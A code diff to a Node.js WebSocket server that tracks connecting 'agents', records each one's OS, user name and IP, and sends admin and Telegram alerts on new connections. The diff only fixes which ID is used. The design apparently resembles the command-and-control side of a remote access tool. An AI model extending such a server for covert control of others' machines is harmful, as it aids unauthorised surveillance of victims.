@@ -134,20 +134,20 @@ wss.on('connection', (ws, req) => {
  // 2. Agent Info Packet
  if (data.type === 'info') {
  // Prevent duplicate rendering by checking if we already know this ID
- if (knownUsers[id] && knownUsers[id].lastSeen > Date.now() - 1000) {
-   return; // Ignore rapid duplicate info packets
+ if (knownUsers[data.id] && knownUsers[data.id].lastSeen > Date.now() - 1000) {
+ return; // Ignore rapid duplicate info packets
  }
 
  clients[id].info = data;
  clients[id].lastSeen = Date.now();
- knownUsers[id] = { 
+ knownUsers[data.id] = { 
  info: data, 
  lastSeen: Date.now(), 
  status: 'Online' 
  };
  notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
  broadcastToAdmin(id, data);
- notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
+ notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${data.id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
  } 
  // 3. Heartbeat
  else if (data.type === 'heartbeat') {
